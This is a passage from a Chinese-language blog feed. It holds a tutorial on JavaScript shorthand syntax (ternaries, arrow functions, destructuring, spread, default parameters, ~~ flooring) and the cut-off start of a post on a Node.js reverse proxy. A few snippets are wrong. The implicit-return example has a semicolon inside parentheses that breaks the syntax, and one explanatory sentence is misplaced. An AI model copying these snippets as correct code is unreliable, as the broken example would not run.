id="If-条件为真的简写"><a href="#If-条件为真的简写" class="headerlink" title="If 条件为真的简写"></a>If 条件为真的简写</h3><p>这可能是微不足道的，但值得一提。在做 “ if 检查” 时，碰到条件为真时，比较运算操作可以省略。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (likeJavaScript === <span class="literal">true</span>)</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (likeJavaScript)</div></pre></td></tr></table></figure></p><p>还有另一个例子。如果 “a” 不等于 true ，如下：</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a;</div><div class="line"><span class="keyword">if</span> ( a !== <span class="literal">true</span> ) &#123;</div><div class="line"><span class="comment">// do something...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> a;</div><div class="line"><span class="keyword">if</span> ( !a ) &#123;</div><div class="line"><span class="comment">// do something...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="JavaScript-for-循环简写"><a href="#JavaScript-for-循环简写" class="headerlink" title="JavaScript for 循环简写"></a>JavaScript for 循环简写</h3><p>如果你只想要简单的 JavaScript ，而不是依赖外部库，如jQuery或lodash，那这个小技巧会非常有用。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; allImgs.length; i++)</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">of</span> allImgs)</div></pre></td></tr></table></figure></p><p>Array.forEach 简写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">logArrayElements</span>(<span class="params">element, index, array</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">"a["</span> + index + <span class="string">"] = "</span> + element);</div><div class="line">&#125;</div><div class="line">[<span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>].forEach(logArrayElements);</div><div class="line"><span class="comment">// logs:</span></div><div class="line"><span class="comment">// a[0] = 2</span></div><div class="line"><span class="comment">// a[1] = 5</span></div><div class="line"><span class="comment">// a[2] = 9</span></div></pre></td></tr></table></figure><h3 id="缩短求值"><a href="#缩短求值" class="headerlink" title="缩短求值"></a>缩短求值</h3><p>我们可以简单地使用缩短逻辑运算符，只用一行代码完成相同的事情，而不是写 6 行代码来分配缺省值。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> dbHost;</div><div class="line"><span class="keyword">if</span> (process.env.DB_HOST) &#123;</div><div class="line">  dbHost = process.env.DB_HOST;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  dbHost = <span class="string">'localhost'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> dbHost = process.env.DB_HOST || <span class="string">'localhost'</span>;</div></pre></td></tr></table></figure></p><h3 id="十进制数指数"><a href="#十进制数指数" class="headerlink" title="十进制数指数"></a>十进制数指数</h3><p>你可能见过这个这种写法。它本质上是一种比较花哨的数字表示法，省去了后面尾随的一堆零。例如，1e7 实际上表示 1 后面跟着 7 个零。它表示一个十进制基数指数 (JavaScript解释为浮点类型)，等于10,000,000。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;&#125;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1e7</span>; i++) &#123;&#125;</div><div class="line"> </div><div class="line"><span class="comment">// 以下将全部求值为 true </span></div><div class="line"><span class="number">1e0</span> === <span class="number">1</span>;</div><div class="line"><span class="number">1e1</span> === <span class="number">10</span>;</div><div class="line"><span class="number">1e2</span> === <span class="number">100</span>;</div><div class="line"><span class="number">1e3</span> === <span class="number">1000</span>;</div><div class="line"><span class="number">1e4</span> === <span class="number">10000</span>;</div><div class="line"><span class="number">1e5</span> === <span class="number">100000</span>;</div></pre></td></tr></table></figure></p><h3 id="对象属性简写"><a href="#对象属性简写" class="headerlink" title="对象属性简写"></a>对象属性简写</h3><p>在 JavaScript 中定义对象字面量非常容易。ES6 提供了一种更简单的方法来将属性分配给对象。如果 name 和 key 名字相同，则可以利用简写符号。</p><p>普通写法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">x</span>:x, <span class="attr">y</span>:y &#125;;</div></pre></td></tr></table></figure></p><p>简写：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> obj = &#123; x, y &#125;;</div></pre></td></tr></table></figure></p><h3 id="箭头函数简写"><a href="#箭头函数简写" class="headerlink" title="箭头函数简写"></a>箭头函数简写</h3><p>普通写法的函数很容易阅读和书写，但是一旦开始在其他函数调用中嵌套它们，它们就会变得有点冗长和混乱。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'Hello'</span>, name);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'Loaded'</span>)</div><div class="line">&#125;, <span class="number">2000</span>);</div><div class="line"> </div><div class="line">list.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(item);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sayHello = <span class="function"><span class="params">name</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'Hello'</span>, name);</div><div class="line"> </div><div class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'Loaded'</span>), <span class="number">2000</span>);</div><div class="line"> </div><div class="line">list.forEach(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">console</span>.log(item));</div></pre></td></tr></table></figure></p><p>需要注意的是，在箭头函数内部的 this 值的确定方式不同于普通写法的函数，所以这两个例子并不完全相同。有关更多详细信息，请参阅 这篇文章中的箭头函数语法。</p><h3 id="隐式返回简写"><a href="#隐式返回简写" class="headerlink" title="隐式返回简写"></a>隐式返回简写</h3><p>我们经常使用 return 关键字来返回一个函数的最终结果。使用单条语句的箭头函数将隐式返回求值结果（该函数必须省略大括号（{}）才能省略 return 关键字）。</p><p>要返回多行表达式（如对象字面量），那么需要用 () 而不是 {} 来包裹你的函数体。这样可以确保代码作为一个单独的表达式被求值返回。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">calcCircumference</span>(<span class="params">diameter</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.PI * diameter</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">calcCircumference = <span class="function"><span class="params">diameter</span> =&gt;</span> (</div><div class="line">  <span class="built_in">Math</span>.PI * diameter;</div><div class="line">)</div></pre></td></tr></table></figure></p><h3 id="参数默认值"><a href="#参数默认值" class="headerlink" title="参数默认值"></a>参数默认值</h3><p>你可以使用 if 语句为函数参数定义默认值。在 ES6 中，你可以在函数声明本身中定义参数默认值。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">volume</span>(<span class="params">l, w, h</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (w === <span class="literal">undefined</span>)</div><div class="line">    w = <span class="number">3</span>;</div><div class="line">  <span class="keyword">if</span> (h === <span class="literal">undefined</span>)</div><div class="line">    h = <span class="number">4</span>;</div><div class="line">  <span class="keyword">return</span> l * w * h;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volume = <span class="function">(<span class="params">l, w = <span class="number">3</span>, h = <span class="number">4</span> </span>) =&gt;</span> (l * w * h);</div><div class="line"> </div><div class="line">volume(<span class="number">2</span>) <span class="comment">//output: 24</span></div></pre></td></tr></table></figure></p><h3 id="模板字面量"><a href="#模板字面量" class="headerlink" title="模板字面量"></a>模板字面量</h3><p>你是不是已经厌倦了用 ‘ + ‘ 来连接多个变量拼接成一个字符串？有没有更简单的方式来完成吗？如果你可以使用 ES6 的话，那么恭喜你，你要做的只是使用反引号和 ${} 来包裹你的变量。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> welcome = <span class="string">'You have logged in as '</span> + first + <span class="string">' '</span> + last + <span class="string">'.'</span></div><div class="line"> </div><div class="line"><span class="keyword">const</span> db = <span class="string">'http://'</span> + host + <span class="string">':'</span> + port + <span class="string">'/'</span> + database;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> welcome = <span class="string">`You have logged in as <span class="subst">$&#123;first&#125;</span> <span class="subst">$&#123;last&#125;</span>`</span>;</div><div class="line"> </div><div class="line"><span class="keyword">const</span> db = <span class="string">`http://<span class="subst">$&#123;host&#125;</span>:<span class="subst">$&#123;port&#125;</span>/<span class="subst">$&#123;database&#125;</span>`</span>;</div></pre></td></tr></table></figure></p><h3 id="解构赋值简写"><a href="#解构赋值简写" class="headerlink" title="解构赋值简写"></a>解构赋值简写</h3><p>如果你正在使用任何流行的 web 框架，那么你很有可能会使用数组或者对象字面量形式的数据在组件和 API 之间传递信息。一旦组件接收到数据对象，你就需要将其展开。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> observable = <span class="built_in">require</span>(<span class="string">'mobx/observable'</span>);</div><div class="line"><span class="keyword">const</span> action = <span class="built_in">require</span>(<span class="string">'mobx/action'</span>);</div><div class="line"><span class="keyword">const</span> runInAction = <span class="built_in">require</span>(<span class="string">'mobx/runInAction'</span>);</div><div class="line"> </div><div class="line"><span class="keyword">const</span> store = <span class="keyword">this</span>.props.store;</div><div class="line"><span class="keyword">const</span> form = <span class="keyword">this</span>.props.form;</div><div class="line"><span class="keyword">const</span> loading = <span class="keyword">this</span>.props.loading;</div><div class="line"><span class="keyword">const</span> errors = <span class="keyword">this</span>.props.errors;</div><div class="line"><span class="keyword">const</span> entity = <span class="keyword">this</span>.props.entity;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; observable, action, runInAction &#125; <span class="keyword">from</span> <span class="string">'mobx'</span>;</div><div class="line"> </div><div class="line"><span class="keyword">const</span> &#123; store, form, loading, errors, entity &#125; = <span class="keyword">this</span>.props;</div></pre></td></tr></table></figure></p><p>你甚至可以给变量重新分配变量名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123; store, form, loading, errors, <span class="attr">entity</span>:contact &#125; = <span class="keyword">this</span>.props;</div></pre></td></tr></table></figure><h3 id="多行字符串简写"><a href="#多行字符串简写" class="headerlink" title="多行字符串简写"></a>多行字符串简写</h3><p>如果你曾经发现自己需要在代码中编写多行字符串，那么你将会这样写：</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> lorem = <span class="string">'Lorem ipsum dolor sit amet, consectetur\n\t'</span></div><div class="line">    + <span class="string">'adipisicing elit, sed do eiusmod tempor incididunt\n\t'</span></div><div class="line">    + <span class="string">'ut labore et dolore magna aliqua. Ut enim ad minim\n\t'</span></div><div class="line">    + <span class="string">'veniam, quis nostrud exercitation ullamco laboris\n\t'</span></div><div class="line">    + <span class="string">'nisi ut aliquip ex ea commodo consequat. Duis aute\n\t'</span></div><div class="line">    + <span class="string">'irure dolor in reprehenderit in voluptate velit esse.\n\t'</span></div></pre></td></tr></table></figure></p><p>但是有一种更简单的方法。只需使用反引号。</p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> lorem = <span class="string">`Lorem ipsum dolor sit amet, consectetur</span></div><div class="line"><span class="string">    adipisicing elit, sed do eiusmod tempor incididunt</span></div><div class="line"><span class="string">    ut labore et dolore magna aliqua. Ut enim ad minim</span></div><div class="line"><span class="string">    veniam, quis nostrud exercitation ullamco laboris</span></div><div class="line"><span class="string">    nisi ut aliquip ex ea commodo consequat. Duis aute</span></div><div class="line"><span class="string">    irure dolor in reprehenderit in voluptate velit esse.`</span></div></pre></td></tr></table></figure></p><h3 id="展开运算符简写"><a href="#展开运算符简写" class="headerlink" title="展开运算符简写"></a>展开运算符简写</h3><p>在ES6中引入的 展开运算符 有几个用例，使 JavaScript 代码更高效、更有趣。它可以用来替换某些数组函数。展开运算符写起来很简单，就是三个点。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 拼接数组</span></div><div class="line"><span class="keyword">const</span> odd = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>];</div><div class="line"><span class="keyword">const</span> nums = [<span class="number">2</span> ,<span class="number">4</span> , <span class="number">6</span>].concat(odd);</div><div class="line"> </div><div class="line"><span class="comment">// 克隆数组</span></div><div class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</div><div class="line"><span class="keyword">const</span> arr2 = arr.slice()</div></pre></td></tr></table></figure></p><p>但是有一种更简单的方法。只需使用反引号。</p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 拼接数组</span></div><div class="line"><span class="keyword">const</span> odd = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span> ];</div><div class="line"><span class="keyword">const</span> nums = [<span class="number">2</span> ,<span class="number">4</span> , <span class="number">6</span>, ...odd];</div><div class="line"><span class="built_in">console</span>.log(nums); <span class="comment">// [ 2, 4, 6, 1, 3, 5 ]</span></div><div class="line"> </div><div class="line"><span class="comment">// 克隆数组</span></div><div class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</div><div class="line"><span class="keyword">const</span> arr2 = [...arr];</div></pre></td></tr></table></figure></p><p>和 concat() 函数不同，你可以在另一个数组里的任意位置插入一个数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> odd = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span> ];</div><div class="line"><span class="keyword">const</span> nums = [<span class="number">2</span>, ...odd, <span class="number">4</span> , <span class="number">6</span>];</div></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123; a, b, ...z &#125; = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> &#125;;</div><div class="line"><span class="built_in">console</span>.log(a) <span class="comment">// 1</span></div><div class="line"><span class="built_in">console</span>.log(b) <span class="comment">// 2</span></div><div class="line"><span class="built_in">console</span>.log(z) <span class="comment">// &#123; c: 3, d: 4 &#125;</span></div></pre></td></tr></table></figure><h3 id="强制参数简写"><a href="#强制参数简写" class="headerlink" title="强制参数简写"></a>强制参数简写</h3><p>默认情况下，如果 JavaScript 传递的值没赋值，它将设置函数参数为 undefined 。其他一些语言会抛出警告或错误。为了强制给参数赋值，如果参数没有定义的话，你可以使用 if 表达式抛出错误，或者可以可以利用强制参数简写。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">bar</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(bar === <span class="literal">undefined</span>) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Missing parameter!'</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> bar;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mandatory = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Missing parameter!'</span>);</div><div class="line">&#125;</div><div class="line"> </div><div class="line">foo = <span class="function">(<span class="params">bar = mandatory(</span>)) =&gt;</span> &#123;</div><div class="line">  <span class="keyword">return</span> bar;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="Array-find-简写"><a href="#Array-find-简写" class="headerlink" title="Array.find 简写"></a>Array.find 简写</h3><p>如果你曾经使用原生 JavaScript 写一个查找函数，你可能会使用 for 循环。在 ES6 中，你可以使用名为find()的新数组函数。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> pets = [</div><div class="line">  &#123; <span class="attr">type</span>: <span class="string">'Dog'</span>, <span class="attr">name</span>: <span class="string">'Max'</span>&#125;,</div><div class="line">  &#123; <span class="attr">type</span>: <span class="string">'Cat'</span>, <span class="attr">name</span>: <span class="string">'Karl'</span>&#125;,</div><div class="line">  &#123; <span class="attr">type</span>: <span class="string">'Dog'</span>, <span class="attr">name</span>: <span class="string">'Tommy'</span>&#125;,</div><div class="line">]</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">findDog</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;pets .length; ++i) &#123;</div><div class="line">    <span class="keyword">if</span>(pets[i].type === <span class="string">'Dog'</span> &amp;&amp; pets[i].name === name) &#123;</div><div class="line">      <span class="keyword">return</span> pets[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pet = pets.find(<span class="function"><span class="params">pet</span> =&gt;</span> pet.type ===<span class="string">'Dog'</span> &amp;&amp; pet.name === <span class="string">'Tommy'</span>);</div><div class="line"><span class="built_in">console</span>.log(pet); <span class="comment">// &#123; type: 'Dog', name: 'Tommy' &#125;</span></div></pre></td></tr></table></figure></p><h3 id="Object-key-简写"><a href="#Object-key-简写" class="headerlink" title="Object[key] 简写"></a>Object[key] 简写</h3><p>你知道 Foo.bar 可以写成 Foo[‘bar’] 吗? 起初，似乎没有什么理由说为什么让你这样写。但是，这种表示法为您提供了编写可重用代码的构建块。</p><p>考虑下一个验证函数的简单例子：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">values</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(!values.first)</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">  <span class="keyword">if</span>(!values.last)</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(validate(&#123;<span class="attr">first</span>:<span class="string">'Bruce'</span>,<span class="attr">last</span>:<span class="string">'Wayne'</span>&#125;)); <span class="comment">// true</span></div></pre></td></tr></table></figure></p><p>这个函数很好的实现了所需的功能。但是，考虑一个场景，在这个场景中，你有非常多的表单需要验证，但是需要使用不同的字段和规则。那么构建一个在运行时被配置的通用验证函数岂不是更好？</p><p>简写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 对象验证规则</span></div><div class="line"><span class="keyword">const</span> schema = &#123;</div><div class="line">  first: &#123;</div><div class="line">    required:<span class="literal">true</span></div><div class="line">  &#125;,</div><div class="line">  last: &#123;</div><div class="line">    required:<span class="literal">true</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="comment">// 通用的验证函数</span></div><div class="line"><span class="keyword">const</span> validate = <span class="function">(<span class="params">schema, values</span>) =&gt;</span> &#123;</div><div class="line">  <span class="keyword">for</span>(field <span class="keyword">in</span> schema) &#123;</div><div class="line">    <span class="keyword">if</span>(schema[field].required) &#123;</div><div class="line">      <span class="keyword">if</span>(!values[field]) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(validate(schema, &#123;<span class="attr">first</span>:<span class="string">'Bruce'</span>&#125;)); <span class="comment">// false</span></div><div class="line"><span class="built_in">console</span>.log(validate(schema, &#123;<span class="attr">first</span>:<span class="string">'Bruce'</span>,<span class="attr">last</span>:<span class="string">'Wayne'</span>&#125;)); <span class="comment">// true</span></div></pre></td></tr></table></figure><p>现在创建了一个可以在所有的表单里重用的验证函数，而不必为每个表单单独写一个特定的验证函数。</p><h3 id="双位非运算符简写"><a href="#双位非运算符简写" class="headerlink" title="双位非运算符简写"></a>双位非运算符简写</h3><p>位操作符是你在刚学习 JavaScript 时会学到的一个特性，但是如果你不处理二进制的话，基本上是从来都不会用上的。</p><p>但是，双位运算符有一个非常实用的使用场景：可以用来代替 Math.floor。双位非运算符的优势在于它执行相同操作的速度更快。你可以在这里查看更多关于位运算符的知识。</p><p>普通写法<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Math</span>.floor(<span class="number">4.9</span>) === <span class="number">4</span>  <span class="comment">//true</span></div></pre></td></tr></table></figure></p><p>简写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">~~<span class="number">4.9</span> === <span class="number">4</span>  <span class="comment">//true</span></div></pre></td></tr></table></figure></p><p>愚人码头注：按位运算符方法执行很快，当你执行数百万这样的操作非常适用，速度明显优于其他方法。但是代码的可读性比较差。还有一个特别要注意的地方，所有的按位运算都以带符号的32位整数进行。处理比较大的数字时（当数字范围超出 ±2^31−1 即：2147483647），会有一些异常情况。使用的时候明确的检查输入数值的范围。 具体可以查看 你可能不知道的 JavaScript 中数字取整：向上取整，向下取整，四舍五入，舍去小数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;三元操作符&quot;&gt;&lt;a href=&quot;#三元操作符&quot; class=&quot;headerlink&quot; title=&quot;三元操作符&quot;&gt;&lt;/a&gt;三元操作符&lt;/h3&gt;&lt;p&gt;当你想在一行代码中写一个 if..else 语句时，这是一个很好的节省代码的方式。&lt;/p&gt;
&lt;p&gt;普通写法：&lt;br&gt;
      
    
    </summary>
    
      <category term="前端" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>用nodeJs做代理服务器</title>
    <link href="http://yoursite.com/2017/01/21/%E7%94%A8nodeJs%E5%81%9A%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2017/01/21/用nodeJs做代理服务器/</id>
    <published>2017-01-21T15:16:06.000Z</published>
    <updated>2017-12-24T15:56:15.472Z</updated>
    
    <content type="html"><![CDATA[<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>` npm install http-proxy </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div 